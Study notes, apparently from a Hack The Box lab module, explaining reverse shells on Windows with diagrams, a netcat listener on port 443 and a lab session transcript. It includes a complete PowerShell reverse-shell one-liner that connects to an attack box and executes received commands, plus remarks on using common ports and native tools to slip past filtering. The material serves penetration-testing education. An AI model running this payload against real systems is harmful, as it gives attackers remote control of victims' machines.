# 🔄 Reverse Shells

> [!info]+ 🎯 What Is a Reverse Shell?  
> A **reverse shell** is the opposite of a bind shell.
> 
> With a reverse shell:
> 
> - 🖥️ **Attack box** starts the listener.
>     
> - 🎯 **Target** initiates the connection.
>     
> - 🐚 The target's shell is then made available through that connection.
>     
> 
> ```text
> 🔄 REVERSE SHELL
> 
> 🖥️ Attack Box                         🎯 Target
>      │                                    │
>      │ 🎧 Listener                        │
>      │ Port 443                           │
>      │                                    │
>      ◄────────────────────────────────────┤
>                  Connection
> ```
> 
> ### 🧠 Remember
> 
> **Bind shell:** Target listens → Attacker connects  
> **Reverse shell:** Attacker listens → Target connects

---

# 🆚 1️⃣ Bind Shell vs Reverse Shell

||🔗 Bind Shell|🔄 Reverse Shell|
|---|---|---|
|Listener|🎯 Target|🖥️ Attack box|
|Connection initiated by|🖥️ Attacker|🎯 Target|
|Target makes outbound connection|❌|✅|
|Target receives inbound connection|✅|❌|
|Firewall concern|Incoming traffic|Outgoing traffic|

### 🔗 Bind

```text
🖥️ Attacker
     │
     │ CONNECT
     ▼
🎯 Target
     │
     └── 🎧 LISTEN
```

### 🔄 Reverse

```text
🖥️ Attacker
     │
     └── 🎧 LISTEN
             ▲
             │ CONNECT
             │
        🎯 Target
```

---

# 🌐 2️⃣ Why Reverse Shells Are Common

Reverse shells are often useful because **outbound connections may be less restricted than inbound connections**.

A typical network might look like:

```text
🎯 Target
   │
   │ Outbound connection
   ▼
🔥 Firewall
   │
   │
   ▼
🌐 Internet
   │
   ▼
🖥️ Attack Box
```

An organization may allow many outbound connections because users and applications need to access external services.

> [!warning]+ 🛡️ But Outbound Does NOT Mean Invisible  
> Security controls can still detect or block reverse shells.
> 
> A firewall with **deep packet inspection / Layer 7 visibility** may inspect the actual contents of network traffic instead of relying only on:
> 
> - IP address
>     
> - Port number
>     
> 
> Therefore, using a commonly allowed port does **not** guarantee that a reverse shell will bypass security controls.

---

# 🎧 3️⃣ Starting the Listener

The attack box becomes the **server** in a reverse-shell connection.

Example:

```bash
sudo nc -lvnp 443
```

Expected:

```text
Listening on 0.0.0.0 443
```

### 🧩 Why Port 443?

Port `443` is commonly associated with:

```text
HTTPS → TCP/443
```

Because HTTPS is widely used, outbound traffic to port `443` is often permitted.

```text
🎯 Target
   │
   │ TCP/443
   ▼
🔥 Firewall
   │
   └── Usually common/legitimate traffic
             │
             ▼
       🖥️ Attack Box
```

> [!important]+ 🧠 Key Point  
> Using a common port can help with **basic network filtering**, but it does **not** automatically evade advanced inspection.
> 
> **Port allowed ≠ traffic trusted.**

---

# 🪟 4️⃣ Windows Reverse Shell

The example uses **PowerShell** to establish a reverse shell from a Windows target.

The general process is:

```text
1️⃣ 🖥️ Attack box starts listener
             ↓
2️⃣ 🎯 Windows target executes payload
             ↓
3️⃣ 🎯 Target creates TCP connection
             ↓
4️⃣ 🖥️ Attack box receives connection
             ↓
5️⃣ 🐚 PowerShell shell becomes available
```

---

# 🧰 5️⃣ Why Use Native Tools?

Netcat can be used to initiate a reverse shell on Windows, but it is **not native to Windows**.

That means you may first need to transfer a Netcat executable onto the target.

This creates an additional problem:

```text
Need reverse shell
      │
      ▼
Need Netcat
      │
      ▼
Need to transfer Netcat
      │
      ▼
Need file-transfer capability
```

Instead, it can be advantageous to use applications already available on the target.

This is part of the **Living off the Land (LotL)** concept.

> [!tip]+ 🔍 Question to Ask  
> When trying to establish a reverse shell, ask:
> 
> **"What applications and shell languages are already available on the target?"**
> 
> For Windows, this may include:
> 
> - 🪟 Command Prompt
>     
> - 💙 PowerShell
>     
> - Other native Windows components
>     

---

# 💙 6️⃣ PowerShell Reverse-Shell Payload

The material uses a PowerShell one-liner that creates a TCP connection back to the attack box.

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### 🔎 Important Parts

```text
TCPClient
    │
    └── Creates TCP connection
             │
             ▼
      10.10.14.158:443
             │
             ▼
       Attack Box Listener
```

The payload essentially:

```text
🎯 Target
   │
   ├── Creates TCP client
   │
   ├── Connects to attack box
   │
   ├── Gets network stream
   │
   ├── Reads commands
   │
   ├── Executes them through PowerShell
   │
   └── Sends results back
```

---

# 🧠 7️⃣ What Is the Payload?

In this context, the PowerShell code is the **payload**.

A payload is the command/code delivered to the target to perform the desired action.

```text
🎯 Target
    ▲
    │
    │ Payload
    │
🖥️ Attack Box
```

The payload can also be referred to as **shell code** in the material.

> [!important]+ 💡 Payload vs Shell  
> **Payload** = the code/command used to establish the connection.
> 
> **Shell** = the resulting command interface you interact with.

---

# 🛡️ 8️⃣ Windows Defender Blocks the Payload

When the PowerShell payload was executed, Windows Defender detected it:

```text
This script contains malicious content and has been blocked
by your antivirus software.
```

### 🚨 What Happened?

```text
🎯 Windows Target
       │
       ▼
💙 PowerShell Payload
       │
       ▼
🛡️ Windows Defender
       │
       └── ❌ BLOCKED
```

From a defensive perspective:

> 🟢 **The security control worked as intended.**

From an offensive testing perspective:

> 🔴 The security control prevents the reverse shell from executing.

---

# 🛡️ 9️⃣ Antivirus Is a Major Consideration

When attempting to establish a reverse shell, endpoint protection can prevent the payload from executing.

Important security controls include:

```text
🛡️ Antivirus
🛡️ EDR
🔥 Host Firewall
🌐 Network Firewall
🔍 IDS / IPS
🔎 Deep Packet Inspection
```

A reverse shell therefore depends on more than simply having network connectivity.

---

# 🔄 🔟 Successful Reverse Shell

In the lab scenario, after the security control is disabled, the target connects back to the listener.

Attack box:

```bash
sudo nc -lvnp 443
```

Then:

```text
Listening on 0.0.0.0 443
Connection received on 10.129.36.68 49674

PS C:\Users\htb-student>
```

🎉 The connection has been established.

---

# 🐚 1️⃣1️⃣ How Do You Know You Have a Shell?

The prompt changes to:

```text
PS C:\Users\htb-student>
```

You can then interact with the Windows operating system.

For example:

```powershell
whoami
```

Output:

```text
ws01\htb-student
```

This confirms that commands are being executed on the target.

---

# 🔄 1️⃣2️⃣ Complete Reverse-Shell Flow

```text
                       🔄 REVERSE SHELL
                              │
                              ▼
                    🖥️ ATTACK BOX
                              │
                              ├── 🎧 nc -lvnp 443
                              │
                              │
                              │       TCP/443
                              │ ◄──────────────────┐
                              │                    │
                              │                    │
                              ▼                    │
                       📥 Connection              │
                                                   │
                                            🎯 WINDOWS TARGET
                                                   │
                                                   ├── PowerShell
                                                   │
                                                   ├── TCPClient
                                                   │
                                                   ├── Connect
                                                   │
                                                   └── 🐚 Shell
```

---

# 🧠 1️⃣3️⃣ The Most Important Concept

The easiest way to remember a reverse shell:

> [!success]+ 🔄 REVERSE = TARGET CALLS BACK
> 
> ```text
> 🔗 BIND SHELL
> Target listens
>      ↓
> Attacker connects
> 
> 🔄 REVERSE SHELL
> Attacker listens
>      ↓
> Target connects
> ```
> 
> **Bind:** `TARGET → LISTEN`  
> **Reverse:** `ATTACKER → LISTEN`

---

# 📌 1️⃣4️⃣ Quick Reference

### 🖥️ Attack Box — Start Listener

```bash
sudo nc -lvnp 443
```

### 🎯 Windows Target — Reverse Connection

```text
PowerShell payload
        │
        ▼
TCPClient
        │
        ▼
<ATTACKER_IP>:443
```

### 🐚 Result

```text
PS C:\Users\htb-student>
```

---

# 🎯 1️⃣5️⃣ Key Takeaways

- 🔄 **Reverse shell:** target initiates the connection.
    
- 🎧 The **attack box listens**.
    
- 🎯 The **target connects back**.
    
- 🪟 PowerShell can be used to create a reverse shell on Windows.
    
- 🧰 Native tools are useful because they may already exist on the target.
    
- 🌐 Common outbound ports such as `443` may be less restricted.
    
- 🛡️ Antivirus/EDR can detect and block reverse-shell payloads.
    
- 🔍 Deep packet inspection can potentially detect suspicious traffic even when using an allowed port.
    
- 🐚 Once connected, the attacker can interact with the target's shell.
    
- 🧠 Always identify what tools, shells, and applications are available on the target.
    

> **💡 Mental Model:**
> 
> ```text
> 🎯 TARGET
>     │
>     │ "I'll connect to you."
>     │
>     └──────────────────────►
>                              🖥️ ATTACK BOX
>                                   │
>                                   └── 🎧 LISTENING
>                                         │
>                                         ▼
>                                    🐚 SHELL
> ```